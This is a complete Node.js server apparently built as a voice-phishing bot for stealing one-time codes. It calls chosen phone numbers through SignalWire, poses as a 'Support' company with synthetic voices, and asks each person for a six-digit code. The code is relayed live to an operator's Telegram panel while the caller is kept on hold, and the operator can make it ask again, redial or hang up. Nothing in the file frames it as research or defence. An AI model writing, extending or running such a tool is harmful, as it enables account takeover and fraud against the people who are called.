const express=require("express")
const bodyParser=require("body-parser")
const fetch=require("node-fetch")

const app=express()
app.use(bodyParser.urlencoded({extended:false}))
app.use(bodyParser.json())

const PORT=process.env.PORT||3000

// ENV
const TELEGRAM_TOKEN=process.env.TELEGRAM_TOKEN
const CHAT_ID=process.env.CHAT_ID
const SW_PROJECT=process.env.SW_PROJECT
const SW_TOKEN=process.env.SW_TOKEN
const SW_SPACE=process.env.SW_SPACE
const SW_NUMBER=process.env.SW_NUMBER
const BASE_URL=process.env.BASE_URL

// SETTINGS
let settings={
company:"Support",
digits:6,
assistant:0
}

const assistants=[
{ name:"Nova",voice:"Polly.Joanna"},
{ name:"Lyra",voice:"Polly.Amy"},
{ name:"Orion",voice:"Polly.Brian"},
{ name:"Astra",voice:"Polly.Matthew"},
{ name:"Kairo",voice:"Polly.Ivy"},
{ name:"Solara",voice:"Polly.Justin"}
]

// STATE
let activeCallSid=null
let activeCaller=null
let activeCode=null
let callStart=null
let lastCaller=null
let panelMessageId=null
let pendingAction=null
let logs=[]

// AUTH
function auth(){
return "Basic "+Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64")
}

// TELEGRAM
async function tg(method,data){
return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,{
method:"POST",
headers:{'Content-Type':'application/json'},
body:JSON.stringify(data)
}).then(r=>r.json())
}

async function tgSend(text,buttons=null){
const body={chat_id:CHAT_ID,text}
if(buttons) body.reply_markup={inline_keyboard:buttons}
return tg("sendMessage",body)
}

// PANEL TEXT
function panelText(){

let duration="00:00"

if(callStart){
let s=Math.floor((Date.now()-callStart)/1000)
let m=Math.floor(s/60)
let sec=s%60
duration=`${String(m).padStart(2,"0")}:${String(sec).padStart(2,"0")}`
}

return `📞 IVR CONTROL PANEL

Caller: ${activeCaller||"None"}
Code: ${activeCode||"Waiting"}
Duration: ${duration}

Company: ${settings.company}
Digits: ${settings.digits}
Assistant: ${assistants[settings.assistant].name}`
}

// PANEL BUTTONS
function panelButtons(){
return[
[
{text:"✔ Confirm",callback_data:"confirm"},
{text:"🔁 Ask Again",callback_data:"retry"}
],
[
{text:"⛔ Hang Up",callback_data:"hangup"}
],
[
{text:"📞 Start Call",callback_data:"startcall"},
{text:"☎ Call Last",callback_data:"calllast"}
],
[
{text:"📊 Status",callback_data:"status"},
{text:"📜 Logs",callback_data:"logs"}
]
]
}

// UPDATE PANEL
async function updatePanel(){

if(!panelMessageId){
let msg=await tgSend(panelText(),panelButtons())
panelMessageId=msg.result.message_id
return
}

try{
await tg("editMessageText",{
chat_id:CHAT_ID,
message_id:panelMessageId,
text:panelText(),
reply_markup:{inline_keyboard:panelButtons()}
})
}catch{}
}

// ROOT
app.get("/",(req,res)=>{
res.send("Server running")
})

// IVR
app.post("/ivr",(req,res)=>{

const digits=req.body.Digits
const caller=req.body.From
const sid=req.body.CallSid

if(!digits){

res.type("text/xml")
return res.send(`
<Response>
<Gather numDigits="${settings.digits}" action="${BASE_URL}/ivr">
<Say voice="${assistants[settings.assistant].voice}">
Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
</Say>
</Gather>
<Redirect>${BASE_URL}/ivr</Redirect>
</Response>
`)
}

activeCallSid=sid
activeCaller=caller
activeCode=digits
lastCaller=caller
callStart=callStart||Date.now()

logs.unshift(`${caller} : ${digits}`)
logs=logs.slice(0,10)

// FAST RESPONSE
res.type("text/xml")
res.send(`
<Response>
<Say voice="${assistants[settings.assistant].voice}">
Thank you. Your code has been received. Please hold.
</Say>
<Redirect>${BASE_URL}/hold</Redirect>
</Response>
`)

// TELEGRAM AFTER
setTimeout(async()=>{
await tgSend(`📞 CODE RECEIVED

Caller: ${caller}
Code: ${digits}`)

updatePanel()
},0)

})

// HOLD LOOP
app.post("/hold",(req,res)=>{

res.type("text/xml")
res.send(`
<Response>
<Pause length="8"/>
<Redirect>${BASE_URL}/hold</Redirect>
</Response>
`)
})

// TELEGRAM
app.post("/telegram",async(req,res)=>{

const msg=req.body.message
const callback=req.body.callback_query

// COMMANDS
if(msg){

const text=msg.text

if(text==="/panel"||text==="/menu"||text==="/status"){
panelMessageId=null
updatePanel()
}

if(text==="/logs"){
let t="📜 Logs\n\n"
logs.forEach(l=>t+=l+"\n")
tgSend(t)
}

if(text.startsWith("/call ")){
let num=text.split(" ")[1]
startCall(num)
}

if(text==="/calllast"){
startCall(lastCaller)
}

}

// BUTTONS
if(callback){

const action=callback.data

if(action==="confirm"){
await endCall()
tgSend("✔ Confirmed")
}

if(action==="retry"){
await retryCall()
}

if(action==="hangup"){
await endCall()
}

if(action==="calllast"){
startCall(lastCaller)
}

if(action==="status"){
updatePanel()
}

if(action==="logs"){
let t="📜 Logs\n\n"
logs.forEach(l=>t+=l+"\n")
tgSend(t)
}

}

res.sendStatus(200)

})

// START CALL
async function startCall(number){

await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls.json`,{
method:"POST",
headers:{
Authorization:auth(),
"Content-Type":"application/x-www-form-urlencoded"
},
body:new URLSearchParams({
From:SW_NUMBER,
To:number,
Url:`${BASE_URL}/ivr`
})
})

}

// END CALL
async function endCall(){

if(!activeCallSid)return

await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`,{
method:"POST",
headers:{
Authorization:auth(),
"Content-Type":"application/x-www-form-urlencoded"
},
body:new URLSearchParams({Status:"completed"})
})

activeCallSid=null
activeCode=null
callStart=null
updatePanel()

}

// RETRY
async function retryCall(){

await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}.json`,{
method:"POST",
headers:{
Authorization:auth(),
"Content-Type":"application/x-www-form-urlencoded"
},
body:new URLSearchParams({Url:`${BASE_URL}/ivr`})
})

}

// LIVE PANEL TIMER
setInterval(updatePanel,2000)

app.listen(PORT,()=>{
console.log("Server running")
})
